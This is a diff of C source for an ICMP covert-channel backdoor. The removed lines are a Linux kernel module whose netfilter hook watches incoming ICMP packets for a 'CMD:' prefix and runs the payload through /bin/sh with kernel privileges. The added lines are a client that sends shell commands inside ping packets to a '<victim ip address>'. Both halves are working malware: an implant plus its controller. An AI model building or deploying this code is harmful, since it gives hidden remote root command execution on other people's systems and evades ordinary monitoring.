@@ -1,120 +1,206 @@
-#include <linux/module.h>     /* Needed by all modules */
-#include <linux/kernel.h>     /* Needed for KERN_INFO */
-#include <linux/init.h>       /* Needed for the macros */
-#include <linux/skbuff.h>
-#include <linux/in.h>
-#include <linux/ip.h>
-#include <linux/icmp.h>
-#include <linux/netdevice.h>
-#include <linux/netfilter.h>
-#include <linux/netfilter_ipv4.h>
+#include "client.h"
 
-///< The license type -- this affects runtime behavior
-MODULE_LICENSE("GPL");
-///< The version of the module
-MODULE_VERSION("0.1");
-  
-#define MaxCmdLen 128
-// request包的结构
-struct icmp_echo {
-    // header
-    uint8_t type;
-    uint8_t code;
-    uint16_t checksum;
+unsigned char ServerOpen=1;
 
-    uint16_t ident;
-    uint16_t seq;
+// Calculating the Check Sum
+uint16_t calculate_checksum(unsigned char* buffer, int bytes)
+{
+    uint32_t checksum = 0;
+    unsigned char* end = buffer + bytes;
 
-    // data
-    double sending_ts;
-    char magic[MaxCmdLen];
-};
-
-
-static char * envp[] = { "HOME=/", NULL };
-static char * argv[] = { "/bin/sh","-c","/usr/bin/ls -la > /tmp/3qrfaf.txt",NULL};
-
-static struct nf_hook_ops hook;
-
-/* dump packet's data */
-void pkt_hex_dump(struct sk_buff *skb){
-    size_t len;
-    int rowsize = 16;
-    int i, l, linelen, remaining;
-    int li = 0;
-    uint8_t *data, ch; 
-    struct iphdr *ip = (struct iphdr *)skb_network_header(skb);
-
-    printk("Packet hex dump:\n");
-    data = (uint8_t *) skb_network_header(skb);
-
-    len=ntohs(ip->tot_len);
-
-    remaining = len;
-    for (i = 0; i < len; i += rowsize) {
-        printk("%06d\t", li);
-        linelen = min(remaining, rowsize);
-        remaining -= rowsize;
-        for (l = 0; l < linelen; l++) {
-            ch = data[l];
-            printk(KERN_CONT "%02X ", (uint32_t) ch);
-        }
-        data += linelen;
-        li += 10; 
-        printk(KERN_CONT "\n");
+    // odd bytes add last byte and reset end
+    if (bytes % 2 == 1) {
+        end = buffer + bytes - 1;
+        checksum += (*end) << 8;
     }
+
+    // add words of two bytes, one by one
+    while (buffer < end) {
+        checksum += buffer[0] << 8;
+        checksum += buffer[1];
+        buffer += 2;
+    }
+
+    // add carry if any
+    uint32_t carray = checksum >> 16;
+    while (carray) {
+        checksum = (checksum & 0xffff) + carray;
+        carray = checksum >> 16;
+    }
+
+    // negate it
+    checksum = ~checksum;
+
+    return checksum & 0xffff;
 }
 
-static char magic[5]="CMD:";
-
-/* This is the hook function itself */
-unsigned int watch_in(void *priv,
-        struct sk_buff *skb,
-        const struct nf_hook_state *state)
+double get_timestamp()
 {
-    int offset=16;
-    struct iphdr *ip = NULL;
-    struct icmp_echo *icmppkt =NULL;
-    char * data = NULL;
-    int icmp_payload_len;
-    ip = (struct iphdr *)skb_network_header(skb);
-    if (ip->protocol != IPPROTO_ICMP){
-        return NF_ACCEPT;
-    }
-    // get payload
-    icmppkt=(struct icmp_echo*)((char *)ip+(ip->ihl<<2));
-    
-    data=(char* )icmppkt+offset;
-    icmp_payload_len = ntohs(ip->tot_len) - (ip->ihl<<2) - offset; 
-
-    printk("data is %s\n",data);
-//    pid_t pid;
-    if(strncmp(data,magic,strlen(magic))==0){
-        argv[2]=data+strlen(magic);
-        printk("strncpy argv2:%s\n",argv[2]);
-        call_usermodehelper(argv[0], argv, envp,UMH_NO_WAIT);
-   }
-    return NF_ACCEPT;
+    struct timeval tv;
+    gettimeofday(&tv, NULL);
+    return tv.tv_sec + ((double)tv.tv_usec) / 1000000;
 }
 
-
-static int __init client_start(void)
+int send_echo_request(int sock, struct sockaddr_in* addr, int ident, int seq,char *cmd)
 {
-    /* Fill in our hook structure */
-    hook.hook = watch_in;        /* Handler function */
-    hook.hooknum  = NF_INET_LOCAL_IN; //路由判断得到如果是发往本机的
-    hook.pf       = AF_INET;
-    hook.priority = NF_IP_PRI_FIRST;   /* Make our function first */
+    // allocate memory for icmp packet
+    struct icmp_echo icmp;
+    bzero(&icmp, sizeof(icmp));
 
-    nf_register_net_hook(&init_net, &hook);
-    printk("Loading module...\n");
+    // fill header files
+    icmp.type = 8;
+    icmp.code = 0;
+    icmp.ident = htons(ident);
+    icmp.seq = htons(seq);
+
+    // fill magic string
+    strncpy(icmp.magic, cmd,MaxCmdLen);
+
+    // fill sending timestamp
+    icmp.sending_ts = get_timestamp();
+
+    // calculate and fill checksum
+    icmp.checksum = htons(
+        calculate_checksum((unsigned char*)&icmp, sizeof(icmp))
+    );
+
+    // send it
+    int bytes = sendto(sock, &icmp, sizeof(icmp), 0,(struct sockaddr*)addr, sizeof(*addr));
+    if (bytes == -1) {
+        DEBUG("fun:%s,sendto failed\n",__func__);
+        return -1;
+    }
+
     return 0;
 }
 
-static void __exit clinet_end(void)
+int recv_echo_reply(int sock, int ident)
 {
-    printk("Goodbye Mr.\n");
-    nf_unregister_net_hook(&init_net,&hook);
+    // allocate buffer
+    char buffer[MTU];
+    struct sockaddr_in peer_addr;
+
+    // receive another packet
+    int addr_len = sizeof(peer_addr);
+    int bytes = recvfrom(sock, buffer, sizeof(buffer), 0,(struct sockaddr*)&peer_addr, &addr_len);
+    if (bytes == -1) {
+        // normal return when timeout
+        if (errno == EAGAIN || errno == EWOULDBLOCK) {
+            DEBUG("fun:%s remote timeout:\n",__func__);
+            return 0;
+        }
+        DEBUG("fun:%s errno:%d\n",__func__,errno);
+        return -1;
+    }
+
+    // find icmp packet in ip packet
+    struct icmp_echo* icmp = (struct icmp_echo*)(buffer + 20);
+
+    // check type
+    if (icmp->type != 0 || icmp->code != 0) {
+        DEBUG("[fun: %s]: icmp type !=0 or icmp code !=0:\n",__func__);
+        return 0;
+    }
+
+    // match identifier
+    if (ntohs(icmp->ident) != ident) {
+        DEBUG("fun:%s icmp ident not match pdi\n",__func__);
+        return 0;
+    }
+
+    // print info
+    printf("%s seq=%d %5.2fms\n",
+        inet_ntoa(peer_addr.sin_addr),
+        ntohs(icmp->seq),
+        (get_timestamp() - icmp->sending_ts) * 1000
+    );
+
+    return 0;
 }
-module_init(client_start);
-module_exit(clinet_end);
+
+// 发送ICMP请求
+unsigned char Ping(char *cmd,char *ip,int sock,int seq){
+     
+    // for store destination address
+    struct sockaddr_in addr;
+    bzero(&addr, sizeof(addr));
+    
+    // fill address, set port to 0
+    addr.sin_family = AF_INET;
+    addr.sin_port = 0;
+    
+
+    if (inet_aton(ip, (struct in_addr*)&addr.sin_addr.s_addr) == 0) {
+        DEBUG("[%s]:inet_aton errno\n",__func__);
+        return -1;
+    };
+    
+    int ident = getpid();
+    
+    int ret = send_echo_request(sock, &addr, ident, seq,cmd);
+    if (ret == -1) {
+        return 0;
+    }
+
+    // try to receive and print reply
+    ret = recv_echo_reply(sock, ident);
+    if (ret == -1) {
+        return 0;
+    }
+
+    return 1;
+}
+
+// Interrupt handler
+void intHandler(int dummy){
+    ServerOpen=0;
+}
+
+int main(int argc,char *argv[]){
+    char cmd[MaxCmdLen]={'C','M','D',':'};
+    int sockfd;
+    if(argc!=2){
+        printf("\nFormat %s <victim ip address>\n", argv[0]);
+        return 0;
+    }
+
+    signal(SIGINT, intHandler);//catching interrupt
+    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+
+    if(sockfd<0){
+        printf("\nSocket file descriptor not received!!\n");
+        return 0;
+    }
+    else{
+        printf("\nSocket file descriptor %d received\n", sockfd);
+    } 
+
+    // set socket timeout option
+    struct timeval tv;
+    tv.tv_sec = 0;
+    tv.tv_usec = RECV_TIMEOUT_USEC;
+    int ret = setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    if (ret == -1) {
+        perror("first setsockopt()");
+        return 0;
+    }
+
+    int seq=1;
+    int cmdlen;
+    // 持续发送sh 指令
+    while(ServerOpen){
+        printf("input sh cmd or \"Quit\" to quit:\n$ ");
+        fgets(cmd+4,MaxCmdLen-4, stdin);
+        // 去除末尾回车
+        cmd[strnlen(cmd,MaxCmdLen)-1]=0;
+        if(strncmp(cmd+4,"Quit",4)==0){
+            break;
+        }
+        // 发送icmp包
+        if(Ping(cmd,argv[1],sockfd,seq)==ICMPNORESPONSE){
+            printf("Some Error Happened...");
+            exit(1);
+        }
+        seq=(seq+1)%(1<<16);
+    }
+}
